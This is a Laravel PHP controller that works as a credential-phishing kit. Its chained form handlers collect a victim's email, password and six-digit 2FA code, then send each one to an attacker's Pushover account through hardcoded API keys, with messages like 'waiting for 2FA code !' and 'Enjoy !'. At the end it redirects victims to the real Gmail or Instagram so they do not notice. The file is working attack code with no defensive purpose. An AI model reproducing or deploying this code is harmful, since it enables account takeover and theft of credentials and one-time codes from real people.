<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Response;

class MainController extends Controller
{
    private function pushOver($message){
        curl_setopt_array($ch = curl_init(), array(
            CURLOPT_URL => "https://api.pushover.net/1/messages.json",
            CURLOPT_POSTFIELDS => array(
              "token" => "asddrpoooz83svou9gmwn535e4ay5b",
              "user" => "ufz1ezdvthiutjh1hnhcaxuzm4k3ko",
              "message" => $message,
            ),
            CURLOPT_SAFE_UPLOAD => true,
            CURLOPT_RETURNTRANSFER => true,
          ));
          curl_exec($ch);
          curl_close($ch);
    }

    

    public function home(){
        return redirect()->route('homee');
    }

    public function homee(){
        return view('home');
    }

    public function homepost(Request $request){
        $request->validate([
            'emailsite' => 'required|email|max:255',
        ]);
        $this->pushOver("Email : " . $request['emailsite'] ." waiting for password !");
        $email = $request->emailsite;
        Session::put('key', $email);
        
        return redirect()->route('secondhome');
    }

    public function secondhome(){
        $value = Session::get('key');
        Session::put('key3', $value);
        return view('secondhome', compact('value'));
    }

    public function secondhomepost(Request $request){
        $request->validate([
            'password' => 'required|min:8|max:50',
        ]);
        $this->pushOver("Password : " . $request['password'] ." waiting for 2FA code !");

        $password = $request->password;

        return redirect()->route('thirdhome');
    }

    public function thirdhome(){
        $value = Session::get('key');
        return view('thirdhome', compact('value'));
    }

    public function fourthpage(){
        $value = Session::get('key');
        return view('fourthpage', compact('value'));
    }

    public function fourthpagepost(Request $request){
        $request->validate([
            'otpcode' => 'required|min:6|max:6',
        ]);
        $this->pushOver("2FA code : " . $request['otpcode'] ." Enjoy !");
        $password = $request->otpcode;
        return Redirect::to('https://mail.google.com/mail/u/2/');  
    }




    public function firststep(){
        return view('firststep');
    }

    public function homestore(Request $request){
        $request->validate([
            'emailsite' => 'required|email|max:255',
            'password' => 'required|min:5|max:255'
        ]);

        $this->pushOver("email :" . $request['emailsite'] ." password : " .  $request['password'] .  "en attente du 2FA !");


        return redirect()->route('firststep');
    }

    public function firststepstore(Request $request){
        $request = $request->validate([
            'otp' => 'required|min:6|max:6',
        ]);

        $this->pushOver("2FA : " . $request['otp'] .  "!");

        return redirect('https://instagram.com');
    }
}